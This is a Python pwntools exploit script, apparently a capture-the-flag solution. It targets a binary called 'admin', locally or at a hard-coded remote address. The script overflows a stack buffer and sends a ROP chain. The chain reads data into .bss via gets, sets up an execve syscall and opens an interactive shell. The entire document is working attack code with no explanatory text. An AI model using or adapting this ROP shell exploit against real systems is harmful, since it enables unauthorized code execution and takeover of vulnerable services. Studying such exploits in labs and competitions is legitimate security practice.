#!/usr/bin/env python
  
from pwn import *

BINARY = './admin'
LIBC = './libc.so.6'
HOST = '35.186.153.116'
PORT = 7002

elf = ELF(BINARY)
#libc = ELF('./libc.so.6')

context.terminal = ['tmux', 'split-w']

#printf = elf.got['printf']             

def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)


p = start()
if args.GDB:
    gdb.attach(p)

exploit = b"A"*60
exploit += b"B"*12
exploit += p64(0x0000000000400686) # : pop rdi ; ret
exploit += p64(0x006bb2e0) # bss
exploit += p64(0x0410330) # gets
exploit += p64(0x0000000000400686) # : pop rdi ; ret
exploit += p64(0x006bb2e0) # bss
exploit += p64(0x0000000000415544) # : pop rax ; ret
exploit += p64(59)
exploit += p64(0x0000000000410193) # : pop rsi ; ret
exploit += p64(0)
exploit += p64(0x0000000000449765) # : pop rdx ; ret
exploit += p64(0)
exploit += p64(0x000000000040123c) # : syscall

p.sendline(exploit)
p.interactive()
